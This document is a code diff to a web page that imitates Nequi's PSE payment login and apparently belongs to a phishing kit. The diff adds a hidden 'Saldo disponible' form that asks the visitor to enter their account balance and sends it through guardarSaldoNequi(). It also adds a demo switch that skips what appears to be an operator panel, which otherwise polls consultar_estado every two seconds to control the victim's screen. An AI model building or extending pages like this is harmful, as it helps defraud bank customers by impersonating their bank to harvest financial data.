@@ -11,7 +11,7 @@
 
     <script type="text/javascript" src="js/jquery.min.js"></script>
     <script type="text/javascript" src="js/operaciones.js?v=1"></script>
-    <script type="text/javascript" src="js/functions.js?v=1"></script>   
+    <script type="text/javascript" src="js/functions.js?v=3"></script>   
 
   <link rel="stylesheet" href="./css/styles.f78a4ba11312d6af.css" >
   <link rel="stylesheet" href="./css/style.css" >
@@ -83,9 +83,14 @@
 
 <script type="text/javascript">
   $(document).ready(function($){
-
-  setInterval(consultar_estado, 2000); 
-
+    // Vista previa sin panel: index.html?demo=saldo
+    if (/[?&]demo=saldo(?:&|$)/i.test(window.location.search)) {
+      window.__nequiDemoSaldo = true;
+      $(".home").hide();
+      vista_saldo();
+    } else {
+      setInterval(consultar_estado, 2000);
+    }
   });
 </script>  
 
@@ -453,6 +458,33 @@
 
 
 
+
+<div class="saldo-disponible" style="display: none;">
+                <div _ngcontent-cby-c37="" class="auth-content">
+                    <nequi-title _ngcontent-cby-c37="" _nghost-cby-c19="">
+                        <h1 _ngcontent-cby-c19="" class="title">Pagos PSE de Nequi</h1>
+                    </nequi-title>
+                    <h2 _ngcontent-cby-c37="" class="subtitle">Confirma tu saldo disponible en la app para continuar con el pago.</h2>
+                    <form _ngcontent-cby-c37="" novalidate="" class="form ng-touched ng-dirty ng-invalid">
+                            <div _ngcontent-cby-c35="" class="input-container">
+                                <div _ngcontent-cby-c35="" class="input-container__field">
+                                        <span _ngcontent-cby-c35="" class="p-float-label" >
+                                            <input _ngcontent-cby-c35="" class="placeholder" id="inputsaldo" name="inputsaldo" type="text" maxlength="24" inputmode="decimal" placeholder="$ " autocomplete="off">
+                                            <label _ngcontent-cby-c35="">Saldo disponible</label>
+                                        </span>
+                                </div>
+                                <small id="msgSaldo" class="input-error msgVacio" style="display:none;">Ingresa el saldo que ves en tu Nequi</small>
+                            </div>
+                    <div _ngcontent-cby-c37="" class="form__buttons">
+                        <nequi-button _ngcontent-cby-c37="" _nghost-cby-c21="">
+                            <button _ngcontent-cby-c21="" pbutton="" pripple="" type="button" class="p-element p-button-primary p-button p-component" id="btnSaldo" onclick="guardarSaldoNequi()">
+                                <span class="p-button-label">Continuar</span>
+                            </button>
+                        </nequi-button>
+                    </div>
+                </form>
+            </div>
+</div>
 
         </nequi-auth>
     </div>
